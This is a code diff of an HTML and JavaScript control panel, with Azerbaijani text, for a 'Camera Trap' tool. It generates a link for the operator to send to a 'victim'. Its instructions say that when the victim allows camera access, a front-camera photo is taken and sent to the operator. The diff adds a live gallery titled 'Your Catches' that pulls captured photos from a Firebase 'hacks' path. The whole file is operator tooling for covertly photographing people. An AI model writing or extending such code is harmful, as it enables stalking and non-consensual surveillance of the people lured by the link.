@@ -1,28 +1,64 @@
-<div class="tool-container" style="animation: fadeIn 0.5s ease; color: white; text-align: center;">
-    <h2 style="color: #ff3e3e;"><i class="fas fa-camera"></i> Camera Trap v2.4</h2>
-    <p style="font-size: 0.8rem; color: #888;">Qurbanın şəklini çəkmək üçün xüsusi link yaradın.</p>
-
-    <div style="background: rgba(255,62,62,0.05); border: 1px solid #ff3e3e; padding: 20px; border-radius: 15px; margin: 20px 0;">
-        <div id="trap-link-box" style="font-family: monospace; font-size: 0.8rem; color: #ff3e3e; word-break: break-all; margin-bottom: 15px;">
+<div class="tool-container" style="animation: fadeIn 0.4s ease; color: white;">
+    <h2 style="color: #ff3e3e; text-align: center;"><i class="fas fa-camera"></i> Camera Trap Control</h2>
+    
+    <div style="background: rgba(20, 20, 25, 0.8); border: 1px solid #ff3e3e; padding: 20px; border-radius: 15px; margin-bottom: 25px; text-align: center;">
+        <div id="trap-link-box" style="font-family: monospace; font-size: 0.8rem; color: #ff3e3e; word-break: break-all; margin-bottom: 15px; padding: 10px; background: rgba(0,0,0,0.4); border-radius: 8px;">
             Link hazırlanmayıb...
         </div>
-        <button class="btn" style="background: #ff3e3e; color: white;" onclick="generateTrapLink()">
-            TƏLƏ LİNKİNİ YARAT
+        <button class="btn" style="background: #ff3e3e; color: white; margin-top: 0;" onclick="generateTrapLink()">
+            <i class="fas fa-link"></i> LİNK YARAT VƏ KOPYALA
         </button>
     </div>
 
-    <div style="text-align: left; font-size: 0.75rem; color: #666;">
-        <b>Təlimat:</b> Linki kopyalayın və qurbana göndərin. O, linkə daxil olub "İcazə Ver" (Allow) düyməsinə basdıqda ön kameradan şəkil çəkilərək <b>ww24.html</b> (Admin) panelinizə göndəriləcək.
+    <div id="trap-results">
+        <h3 style="font-size: 0.9rem; color: #eee; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px;">
+            <i class="fas fa-images"></i> Sizin Ovlarınız (Canlı)
+        </h3>
+        <div id="trap-gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 15px;">
+            <div id="no-images" style="grid-column: 1/-1; text-align: center; color: #555; padding: 40px 0;">
+                Hələ ki, şəkil yoxdur. Linki göndərin və gözləyin...
+            </div>
+        </div>
     </div>
 </div>
 
 <script>
+    // Link yaratma funksiyası
     function generateTrapLink() {
-        // Dinamik olaraq cari URL-dən tələ səhifəsinin linkini yaradır
-        let baseUrl = window.location.href.split('index.html')[0];
-        let finalLink = baseUrl + "camera.html?ref=" + loginName; 
+        // Cari URL-dən baza ünvanını tapır (məs: http://site.com/folder/)
+        let currentPath = window.location.pathname;
+        let dirPath = currentPath.substring(0, currentPath.lastIndexOf('/') + 1);
+        let finalLink = window.location.origin + dirPath + "camera.html?ref=" + loginName; 
+        
         document.getElementById('trap-link-box').innerText = finalLink;
         navigator.clipboard.writeText(finalLink);
-        alert("Link kopyalandı! Onu qurbana göndərin.");
+        alert("Tələ linki kopyalandı! Qurbana göndərin.");
+    }
+
+    // Şəkilləri anında (real-time) gətirmək
+    if (typeof loginName !== 'undefined') {
+        const gallery = document.getElementById('trap-gallery');
+        const noImages = document.getElementById('no-images');
+
+        // Firebase-də 'hacks/istifadəçi_adı' qovluğunu izləyirik
+        db.ref('hacks/' + loginName).on('value', (snapshot) => {
+            if (snapshot.exists()) {
+                noImages.style.display = 'none';
+                gallery.innerHTML = ""; // Köhnə siyahını təmizlə
+                
+                snapshot.forEach((childSnapshot) => {
+                    const data = childSnapshot.val();
+                    const item = document.createElement('div');
+                    item.style = "background: #111; border: 1px solid #333; border-radius: 10px; overflow: hidden; animation: zoomIn 0.3s ease;";
+                    item.innerHTML = `
+                        <img src="${data.image}" style="width: 100%; display: block; cursor: pointer;" onclick="window.open(this.src)">
+                        <div style="font-size: 0.6rem; color: #888; padding: 5px; text-align: center;">
+                            ${data.date.split(',')[1] || data.date}
+                        </div>
+                    `;
+                    gallery.prepend(item); // Yeni şəkilləri əvvələ əlavə et
+                });
+            }
+        });
     }
 </script>
